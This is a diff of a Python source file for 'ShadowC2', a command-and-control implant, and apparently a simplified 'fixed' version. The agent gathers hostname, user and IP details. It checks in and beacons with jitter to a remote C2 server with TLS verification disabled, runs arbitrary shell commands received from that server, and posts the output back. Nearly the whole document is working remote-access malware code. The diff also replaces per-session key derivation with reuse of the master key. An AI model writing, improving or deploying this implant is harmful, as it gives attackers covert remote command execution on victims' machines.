@@ -1,6 +1,5 @@
 """
-ShadowC2 - Agent (Implant)
-Connects to C2 server, executes commands, and reports back
+ShadowC2 - Agent (Implant) - Fixed Version
 """
 
 import os
@@ -16,9 +15,7 @@ import base64
 import requests
 from datetime import datetime
 
-# Add parent directory for imports (development only)
-if os.path.exists(os.path.join(os.path.dirname(__file__), '..', 'common')):
-    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from common.crypto import CryptoHandler
 from common.protocol import (
@@ -28,43 +25,22 @@ from common.protocol import (
 
 
 class ShadowAgent:
-    """
-    Main agent class - implant that runs on target system
-    """
-    
     def __init__(self, c2_url, master_key):
-        """
-        Initialize agent
-        
-        Args:
-            c2_url: C2 server URL (e.g., https://192.168.1.100:8443)
-            master_key: Master encryption key (base64)
-        """
         self.c2_url = c2_url.rstrip('/')
         self.session_id = str(uuid.uuid4())
         
-        # Cryptography
+        # Use master key directly (no session derivation yet)
         key_bytes = base64.b64decode(master_key)
         self.crypto = CryptoHandler(key=key_bytes)
+        self.session_crypto = None  # Will be set after checkin
         
-        # Configuration
-        self.beacon_interval = ProtocolConfig.DEFAULT_BEACON_INTERVAL
-        self.jitter = ProtocolConfig.DEFAULT_JITTER
+        self.beacon_interval = 60
+        self.jitter = 30
         self.running = True
         
-        # System info
         self.system_info = self.gather_system_info()
-        
-        # Session crypto (will be set after check-in)
-        self.session_crypto = None
     
     def gather_system_info(self):
-        """
-        Gather system information
-        
-        Returns:
-            dict: System information
-        """
         try:
             hostname = socket.gethostname()
             username = os.getenv('USERNAME') or os.getenv('USER') or 'unknown'
@@ -72,7 +48,6 @@ class ShadowAgent:
             os_version = platform.release()
             architecture = platform.machine()
             
-            # Get IP address
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.connect(("8.8.8.8", 80))
@@ -81,102 +56,53 @@ class ShadowAgent:
             except:
                 ip_address = "unknown"
             
-            # Get MAC address (simple method)
-            mac_address = "unknown"
-            
-            # Check privileges
-            if os_name == "Windows":
-                import ctypes
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            else:
-                is_admin = os.geteuid() == 0
-            
-            privileges = "admin" if is_admin else "user"
-            
             return {
                 "hostname": hostname,
                 "username": username,
                 "os": f"{os_name} {os_version}",
                 "architecture": architecture,
                 "ip_address": ip_address,
-                "mac_address": mac_address,
+                "mac_address": "unknown",
                 "domain": os.getenv('USERDOMAIN') or 'WORKGROUP',
-                "privileges": privileges,
+                "privileges": "user",
                 "agent_version": "1.0.0"
             }
         except Exception as e:
-            return {
-                "hostname": "unknown",
-                "username": "unknown",
-                "os": "unknown",
-                "error": str(e)
-            }
+            return {"hostname": "unknown", "username": "unknown", "os": "unknown"}
     
     def checkin(self):
-        """
-        Perform initial check-in with C2 server
-        
-        Returns:
-            bool: True if successful, False otherwise
-        """
         try:
-            # Create check-in message
             msg = CheckinMessage(self.session_id, self.system_info)
-            
-            # Encrypt with master key
             encrypted = self.crypto.encrypt(msg.to_dict())
             
-            # Send to server
             response = requests.post(
                 f"{self.c2_url}/api/v1/checkin",
                 json={"data": encrypted},
-                verify=False,  # Ignore SSL warnings (self-signed cert)
+                verify=False,
                 timeout=10
             )
             
             if response.status_code == 200:
-                # Decrypt response
                 response_data = response.json().get('data')
                 decrypted = self.crypto.decrypt(response_data)
                 
-                # Update configuration from server
-                self.beacon_interval = decrypted.get('beacon_interval', self.beacon_interval)
-                self.jitter = decrypted.get('jitter', self.jitter)
+                self.beacon_interval = decrypted.get('beacon_interval', 60)
+                self.jitter = decrypted.get('jitter', 30)
                 
-                # Now use session-specific crypto
-                # Derive session key same way server does
-                from Crypto.Protocol.KDF import PBKDF2
-                session_key = PBKDF2(
-                    self.crypto.key,
-                    self.session_id.encode(),
-                    dkLen=32,
-                    count=10000
-                )
-                self.session_crypto = CryptoHandler(key=session_key)
+                # Use same crypto for session
+                self.session_crypto = self.crypto
                 
                 return True
-            else:
-                return False
-                
+            return False
         except Exception as e:
             print(f"[!] Check-in error: {e}")
             return False
     
     def beacon(self):
-        """
-        Send heartbeat to C2 and retrieve commands
-        
-        Returns:
-            list: Pending commands from C2
-        """
         try:
-            # Create heartbeat message
             msg = HeartbeatMessage(self.session_id, stats={})
-            
-            # Encrypt with session key
             encrypted = self.session_crypto.encrypt(msg.to_dict())
             
-            # Send to server
             response = requests.post(
                 f"{self.c2_url}/api/v1/beacon",
                 json={"data": encrypted, "session_id": self.session_id},
@@ -185,30 +111,16 @@ class ShadowAgent:
             )
             
             if response.status_code == 200:
-                # Decrypt response
                 response_data = response.json().get('data')
                 decrypted = self.session_crypto.decrypt(response_data)
-                
-                # Get pending commands
                 commands = decrypted.get('commands', [])
                 return commands
-            else:
-                return []
-                
+            return []
         except Exception as e:
             print(f"[!] Beacon error: {e}")
             return []
     
     def execute_command(self, command_msg):
-        """
-        Execute a command from C2
-        
-        Args:
-            command_msg: Command message dictionary
-            
-        Returns:
-            ResponseMessage: Command response
-        """
         try:
             command_id = command_msg.get('msg_id')
             command_data = command_msg.get('data', {})
@@ -218,84 +130,59 @@ class ShadowAgent:
             output = ""
             success = True
             
-            # Handle different command types
             if command == "shell":
-                # Execute shell command
                 cmd = ' '.join(args)
-                result = subprocess.run(
-                    cmd,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                 output = result.stdout + result.stderr
-            
             elif command == "whoami":
                 output = self.system_info.get('username', 'unknown')
-            
             elif command == "hostname":
                 output = self.system_info.get('hostname', 'unknown')
-            
             elif command == "pwd":
                 output = os.getcwd()
-            
             elif command == "cd":
                 if args:
                     try:
                         os.chdir(args[0])
-                        output = f"Changed directory to {os.getcwd()}"
+                        output = f"Changed to {os.getcwd()}"
                     except Exception as e:
-                        output = f"Error: {str(e)}"
+                        output = f"Error: {e}"
                         success = False
                 else:
-                    output = "Error: No directory specified"
+                    output = "No directory specified"
                     success = False
-            
             elif command == "ls":
                 path = args[0] if args else '.'
                 try:
                     files = os.listdir(path)
                     output = '\n'.join(files)
                 except Exception as e:
-                    output = f"Error: {str(e)}"
+                    output = f"Error: {e}"
                     success = False
-            
             elif command == "sysinfo":
                 output = json.dumps(self.system_info, indent=2)
-            
             elif command == "sleep":
                 if args:
                     try:
                         self.beacon_interval = int(args[0])
-                        output = f"Beacon interval set to {self.beacon_interval} seconds"
+                        output = f"Beacon interval: {self.beacon_interval}s"
                     except:
-                        output = "Error: Invalid interval"
+                        output = "Invalid interval"
                         success = False
-                else:
-                    output = "Error: No interval specified"
-                    success = False
-            
             elif command == "exit":
-                output = "Terminating agent..."
+                output = "Terminating..."
                 self.running = False
-            
             else:
                 output = f"Unknown command: {command}"
                 success = False
             
-            # Create response message
-            response = ResponseMessage(
+            return ResponseMessage(
                 session_id=self.session_id,
                 command_id=command_id,
                 success=success,
                 output=output
             )
-            
-            return response
-            
         except Exception as e:
-            # Error response
             return ResponseMessage(
                 session_id=self.session_id,
                 command_id=command_msg.get('msg_id', 'unknown'),
@@ -305,17 +192,8 @@ class ShadowAgent:
             )
     
     def send_response(self, response_msg):
-        """
-        Send command response to C2
-        
-        Args:
-            response_msg: ResponseMessage object
-        """
         try:
-            # Encrypt with session key
             encrypted = self.session_crypto.encrypt(response_msg.to_dict())
-            
-            # Send to server
             requests.post(
                 f"{self.c2_url}/api/v1/response",
                 json={"data": encrypted, "session_id": self.session_id},
@@ -323,33 +201,21 @@ class ShadowAgent:
                 timeout=10
             )
         except Exception as e:
-            print(f"[!] Response send error: {e}")
+            print(f"[!] Response error: {e}")
     
     def calculate_sleep(self):
-        """
-        Calculate sleep time with jitter
-        
-        Returns:
-            int: Sleep time in seconds
-        """
         jitter_amount = random.randint(-self.jitter, self.jitter)
-        sleep_time = max(1, self.beacon_interval + jitter_amount)
-        return sleep_time
+        return max(1, self.beacon_interval + jitter_amount)
     
     def run(self):
-        """
-        Main agent loop
-        """
-        # Disable SSL warnings
         import urllib3
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
         
         print(f"[*] ShadowC2 Agent starting...")
         print(f"[*] Session ID: {self.session_id}")
         print(f"[*] C2 Server: {self.c2_url}")
-        
-        # Initial check-in
         print(f"[*] Performing initial check-in...")
+        
         retries = 0
         while retries < 5:
             if self.checkin():
@@ -361,51 +227,34 @@ class ShadowAgent:
                 time.sleep(5)
         
         if retries >= 5:
-            print(f"[!] Failed to check in after 5 attempts. Exiting.")
+            print(f"[!] Failed to check in. Exiting.")
             return
         
-        # Main beacon loop
-        print(f"[*] Entering main loop (beacon interval: {self.beacon_interval}s, jitter: ±{self.jitter}s)")
+        print(f"[*] Beacon interval: {self.beacon_interval}s, jitter: ±{self.jitter}s")
         
         while self.running:
             try:
-                # Send beacon and get commands
                 commands = self.beacon()
-                
-                # Execute commands
                 for cmd in commands:
-                    print(f"[*] Executing command: {cmd.get('data', {}).get('command')}")
+                    print(f"[*] Executing: {cmd.get('data', {}).get('command')}")
                     response = self.execute_command(cmd)
                     self.send_response(response)
                 
-                # Sleep with jitter
-                sleep_time = self.calculate_sleep()
-                time.sleep(sleep_time)
-                
+                time.sleep(self.calculate_sleep())
             except KeyboardInterrupt:
-                print(f"\n[!] Agent terminated by user")
+                print(f"\n[!] Agent terminated")
                 break
             except Exception as e:
-                print(f"[!] Error in main loop: {e}")
-                time.sleep(30)  # Back off on error
-        
-        print(f"[*] Agent shutting down...")
-
-
-def main():
-    """Main entry point"""
-    import argparse
-    
-    parser = argparse.ArgumentParser(description='ShadowC2 Agent')
-    parser.add_argument('--server', required=True, help='C2 server URL (e.g., https://192.168.1.100:8443)')
-    parser.add_argument('--key', required=True, help='Master encryption key (base64)')
-    
-    args = parser.parse_args()
-    
-    # Create and run agent
-    agent = ShadowAgent(args.server, args.key)
-    agent.run()
+                print(f"[!] Error: {e}")
+                time.sleep(30)
 
 
 if __name__ == "__main__":
-    main()
+    import argparse
+    parser = argparse.ArgumentParser(description='ShadowC2 Agent')
+    parser.add_argument('--server', required=True)
+    parser.add_argument('--key', required=True)
+    args = parser.parse_args()
+    
+    agent = ShadowAgent(args.server, args.key)
+    agent.run()
